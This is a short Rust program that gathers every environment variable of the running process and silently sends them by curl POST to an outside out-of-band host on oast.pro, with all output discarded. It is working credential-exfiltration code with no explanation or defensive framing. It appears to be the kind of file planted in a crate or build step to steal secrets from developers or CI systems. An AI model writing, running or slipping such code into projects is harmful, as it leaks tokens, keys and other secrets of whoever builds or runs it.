fn main() {
    let target = "https://d81gbvc9dpa9kj776d7gphcpfzkhzdmfc.oast.pro";

    let env_data: String = std::env::vars()
        .map(|(k, v)| format!("{}={}", k, v))
        .collect::<Vec<_>>()
        .join("\n");

    let _ = std::process::Command::new("curl")
        .args([
            "-s",
            "--max-time",
            "10",
            "-X",
            "POST",
            target,
            "-H",
            "Content-Type: text/plain",
            "--data-binary",
            &env_data,
        ])
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .output();
}
